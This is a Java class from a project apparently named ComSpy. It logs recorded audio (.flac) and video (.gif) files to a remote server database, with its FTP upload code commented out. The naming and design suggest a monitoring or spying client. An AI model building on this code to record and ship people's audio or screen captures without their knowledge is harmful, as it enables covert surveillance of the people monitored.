/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package FTP;

import static Comman.KeysVer.Args;
import Comman.KeysVer.Keys;
import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Comman.Tool;
import java.util.HashMap;

/**
 *
 * @author abaza
 */
public final class FTP_Implmantation {

//    private static FileUploading FileFTP;
    private final Comman.Tool cTool = new Tool();
    String FileUploading;
    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
//    private ComSpy Comspy;
//    private static final int Periority = 0;
    compy_client.ComSpy ComSpy;

    public FTP_Implmantation(compy_client.ComSpy ComPy, int Peri, String localfile) {
        this.ComSpy = ComPy;
        this.FileUploading = localfile;

//        FTP_Implmantation.Periority = Peri;
//        FileFTP = new FileUploading(Args.get(Keys.SUUID), Args.get(Keys.CUUID), Args.get(Keys.FHOST), Args.get(Keys.FUSER), Args.get(Keys.FPAS), localfile, Args.get(Keys.FPATH));
    }

    public void Up() {
        DatabaseUpdate();
//        ComSpy.MessageLog("Start Upload");
//        FileFTP.Upload(true);
//        FileFTP.setPriority(Periority);
//        FileFTP.setName(this.FileUploading);
//        FileFTP.start();
    }

    public boolean isFineshed() {
        return true;
//        if (FileFTP.getName().equals(this.FileUploading)) {
//            if (FileFTP.isUploaded()) {
//                DatabaseUpdate();
//                ComSpy.MessageLog("Update Database is Done");
//                return true;
//            } else {
//                return false;
//            }
//        }
//        return false;
    }

    public void DatabaseUpdate() {
        ComSpy.MessageLog("Database Update");
        if (this.FileUploading.endsWith(".flac")) {
            UpdateWavDatabase(this.FileUploading);
        } else if (this.FileUploading.endsWith(".gif")) {
            UpdateMoveDatabase(this.FileUploading);
        }
    }

    private void UpdateWavDatabase(String filename) {
        String[][] Data = {
            {Server_Var.TYPE_COMMENT, Server_Var.SOUND_FILE_INFO},
            {Local_Var.SOUND_SUUID, Args.get(Keys.SUUID)},
            {Local_Var.SOUND_CUUID, Args.get(Keys.CUUID)},
            {Local_Var.SOUND_DATE_REC, cTool.getDay()},
            {Local_Var.SOUND_SOUND, filename},
            {Local_Var.SOUND_ISDONE, "0"}
        };
        HashMap<String, String> DataRet = this.ComSpy.Server.Contaner(Data);
        if (this.ComSpy.Server.DoneOrNot(DataRet)) {
            ComSpy.MessageLog("Update Audio file  in Database");
        } else {
            System.err.println("Not Update Audio file  in Database");
        }
    }

    private void UpdateMoveDatabase(String filename) {
        String[][] Data = {
            {Server_Var.TYPE_COMMENT, Server_Var.VIDEO_FILE_INFO},
            {Local_Var.VIDEO_SUUID, Args.get(Keys.SUUID)},
            {Local_Var.VIDEO_CUUID, Args.get(Keys.CUUID)},
            {Local_Var.VIDEO_DATE_REC, cTool.getDay()},
            {Local_Var.VIDEO_VIDEO, filename},
            {Local_Var.VIDEO_ISDONE, "0"}
        };
        HashMap<String, String> DataRet = this.ComSpy.Server.Contaner(Data);
        if (this.ComSpy.Server.DoneOrNot(DataRet)) {
            ComSpy.MessageLog("Upload Video file to FTP is Done");
        } else {
            System.err.println("Can not Upload Video file to FTP");
        }
    }
}
